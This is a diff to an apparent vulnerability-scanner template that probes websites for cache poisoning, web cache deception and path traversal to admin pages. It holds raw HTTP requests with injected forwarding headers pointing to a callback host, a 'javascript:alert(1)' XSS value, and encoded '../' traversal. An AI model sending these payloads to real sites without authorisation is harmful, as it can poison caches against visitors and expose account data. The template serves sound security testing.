@@ -1,7 +1,8 @@
 http:
 - matchers:
   - dsl:
-    - contains(body_2, "{{callback}}") || contains(body_2, "evil.com")
+    - (contains(body_2, "host-{{poison_id}}") || contains(body_2, "{{callback}}.evil.com"))
+      && !contains(body_1, "host-{{poison_id}}")
     type: dsl
   raw:
   - 'GET /?cachebuster={{cache_buster}} HTTP/1.1
@@ -10,7 +11,7 @@ http:
 
     X-Forwarded-Host: {{callback}}
 
-    X-Host: {{callback}}
+    X-Host: {{callback}}/host-{{poison_id}}
 
     X-Forwarded-Server: {{callback}}
 
@@ -28,7 +29,8 @@ http:
     '
 - matchers:
   - dsl:
-    - contains(body_2, "http://{{callback}}") || contains(body_2, "javascript:")
+    - (contains(body_2, "xss-{{poison_id}}") || contains(body_2, "javascript:alert(1)"))
+      && !contains(body_1, "xss-{{poison_id}}")
     type: dsl
   raw:
   - 'GET /test{{cache_buster}} HTTP/1.1
@@ -37,7 +39,7 @@ http:
 
     X-Forwarded-Proto: http
 
-    X-Forwarded-Scheme: http://{{callback}}/xss
+    X-Forwarded-Scheme: http://{{callback}}/xss-{{poison_id}}
 
     X-Forwarded-Protocol: javascript:alert(1)
 
@@ -53,8 +55,9 @@ http:
     '
 - matchers:
   - dsl:
-    - contains(body_2, "email") || contains(body_2, "password") || contains(body_2,
-      "token")
+    - '(contains(tolower(body_2), "email") || contains(tolower(body_2), "password")
+      || contains(tolower(body_2), "token")) && contains(tolower(header_2), "content-type:
+      text/css")'
     type: dsl
   raw:
   - 'GET /account/settings/{{cache_buster}}.css HTTP/1.1
@@ -81,8 +84,13 @@ http:
     words:
     - http
     - dns
+  - part: interactsh_request
+    type: word
+    words:
+    - poison-{{poison_id}}
+  matchers-condition: and
   raw:
-  - 'GET /#{{callback}}/poison-{{poison_id}} HTTP/1.1
+  - 'GET /?cachebuster={{cache_buster}}&poison={{callback}}/poison-{{poison_id}} HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -102,7 +110,7 @@ http:
     '
 - matchers:
   - dsl:
-    - contains(body_2, "{{callback}}")
+    - contains(body_2, "pp-{{poison_id}}") && !contains(body_1, "pp-{{poison_id}}")
     type: dsl
   raw:
   - 'GET /?param={{callback}}&cb={{cache_buster}} HTTP/1.1
@@ -118,7 +126,7 @@ http:
     Connection: close
 
 
-    utm_source={{callback}}&callback={{callback}}
+    utm_source={{callback}}/pp-{{poison_id}}&callback={{callback}}/pp-{{poison_id}}
 
     '
   - 'GET /?cb={{cache_buster}} HTTP/1.1
@@ -129,14 +137,19 @@ http:
 
     '
 - matchers:
-  - condition: or
-    type: word
-    words:
-    - admin
-    - dashboard
-    - unauthorized
+  - dsl:
+    - status_code_1 == status_code_2 && (contains(tolower(body_1), "admin") || contains(tolower(body_1),
+      "dashboard") || contains(tolower(body_1), "unauthorized"))
+    type: dsl
   raw:
   - 'GET /api/v1%2f..%2f..%2fadmin?cb={{cache_buster}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: close
+
+    '
+  - 'GET /api/v1/../../admin?cb={{cache_buster}} HTTP/1.1
 
     Host: {{Hostname}}
 
